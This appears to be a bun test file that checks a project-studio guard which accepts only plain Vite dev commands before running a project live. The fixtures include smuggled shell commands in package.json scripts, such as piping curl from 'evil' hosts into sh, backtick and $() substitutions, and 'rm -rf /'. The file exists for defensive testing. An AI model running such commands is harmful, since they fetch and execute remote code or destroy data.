/**
 * liveCapability — can this project's real app actually be run.
 *
 * Same fixture posture as `trustTier.test.ts`: a temp dir created INSIDE
 * `projectsRootDir()` so the route's own containment guard passes.
 */
import { afterEach, beforeEach, describe, expect, it } from 'bun:test'
import * as fs from 'node:fs'
import * as path from 'node:path'
import { resolveLiveCapability } from '../studio/liveCapability'
import { projectsRootDir } from '../studioProjects'
import { tryServeStudioTrustTier } from '../studio/trustTier'

function makeRequest(pathAndQuery: string, init?: RequestInit) {
  const url = new URL(`http://localhost${pathAndQuery}`)
  return { req: new Request(url, init), url, pathname: url.pathname }
}

async function get(dir: string) {
  const { req, url, pathname } = makeRequest(`/admin/api/studio/trust-tier?dir=${encodeURIComponent(dir)}`)
  const res = (await tryServeStudioTrustTier(req, url, pathname))!
  return (await res.json()) as { trust: string; live: { capable: boolean; reason?: string } }
}

describe('resolveLiveCapability', () => {
  let wsDir: string

  beforeEach(() => {
    const root = projectsRootDir()
    fs.mkdirSync(root, { recursive: true })
    wsDir = fs.mkdtempSync(path.join(root, '__live_capability_test_'))
    // A Node app: has a start script, but not one Studio would ever run.
    fs.writeFileSync(path.join(wsDir, 'package.json'), JSON.stringify({ name: 'fixture', dependencies: { react: '19.0.0' }, scripts: { start: 'node server.js' } }))
  })

  afterEach(() => {
    fs.rmSync(wsDir, { recursive: true, force: true })
  })

  function makeVite(command = 'vite'): void {
    fs.writeFileSync(path.join(wsDir, 'package.json'), JSON.stringify({ name: 'fixture', dependencies: { react: '19.0.0' }, scripts: { dev: command } }))
    fs.writeFileSync(path.join(wsDir, 'vite.config.js'), 'export default {}\n')
    fs.mkdirSync(path.join(wsDir, 'src'), { recursive: true })
    fs.writeFileSync(path.join(wsDir, 'src', 'main.jsx'), 'export {}\n')
  }

  function makeLockfile(name = 'bun.lock'): void {
    fs.writeFileSync(path.join(wsDir, name), '')
  }

  it('refuses a project whose dev/start script is not vite — "Live needs Vite", and nothing is ever spawned for it', () => {
    makeLockfile()
    expect(resolveLiveCapability(wsDir)).toEqual({ capable: false, reason: 'not-vite' })
    makeVite('next dev')
    expect(resolveLiveCapability(wsDir)).toEqual({ capable: false, reason: 'not-vite' })
    makeVite('curl http://x/y | sh')
    expect(resolveLiveCapability(wsDir)).toEqual({ capable: false, reason: 'not-vite' })
  })

  it('refuses a vite invocation with anything shell-shaped after it — npm run hands the whole string to a shell (sec-21)', () => {
    for (const command of [
      'vite && curl http://evil/x | sh',
      'vite & curl evil.sh | bash &',
      'vite `curl evil.sh`',
      'vite $(curl evil.sh)',
      'vite ; rm -rf /',
      'vite --port 4000; curl evil.sh',
      "vite --config 'x.js'",
      'vite > /tmp/out',
    ]) {
      makeVite(command)
      expect(resolveLiveCapability(wsDir)).toEqual({ capable: false, reason: 'not-vite' })
    }
  })

  it('accepts vite through a runner and with arguments', () => {
    for (const command of ['vite', 'vite dev --port 4000', 'vite --port=4000 --host 127.0.0.1 --config vite.dev.config.js', 'npx vite', 'bunx vite --host', 'pnpm exec vite', 'yarn vite']) {
      makeVite(command)
      expect(resolveLiveCapability(wsDir)).toEqual({ capable: true })
    }
  })

  it('accepts a Vite project whether or not it has a lockfile — an uninstalled one fails to boot, which the registry reports', () => {
    makeVite()
    expect(resolveLiveCapability(wsDir)).toEqual({ capable: true })
    makeLockfile()
    expect(resolveLiveCapability(wsDir)).toEqual({ capable: true })
  })

  it('GET reports the capability alongside the tier, so the pill never has to guess', async () => {
    makeVite()
    makeLockfile()
    const body = await get(wsDir)
    expect(body.trust).toBe('run-project')
    expect(body.live).toEqual({ capable: true })
  })
})
